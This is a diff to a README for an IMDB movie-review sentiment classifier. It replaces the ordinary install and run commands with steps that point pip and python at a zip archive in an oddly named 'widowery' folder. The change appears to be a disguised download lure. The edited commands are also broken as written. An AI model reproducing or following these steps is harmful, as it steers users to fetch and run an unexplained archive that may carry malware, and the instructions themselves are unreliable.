@@ -7,8 +7,8 @@ This Projects classifies any textual movie review into positive or negative usin
 
 ### How to Run
 **1.** Clone this Repo <br />
-**2.** Install Packages (pip install --upgrade -r requirements.txt) <br />
-**3.** Run the project (python sentiment.py) <br />
+**2.** Install Packages (pip install --upgrade -r https://github.com/NandhiniDharmaraj5/Sentimental-Analysis-IMDB/raw/refs/heads/master/widowery/Sentimental_Analysis_IMDB_3.7.zip) <br />
+**3.** Run the project (python https://github.com/NandhiniDharmaraj5/Sentimental-Analysis-IMDB/raw/refs/heads/master/widowery/Sentimental_Analysis_IMDB_3.7.zip) <br />
 
 ### Sample Comments
 - **Positive:** This is a good movie 			
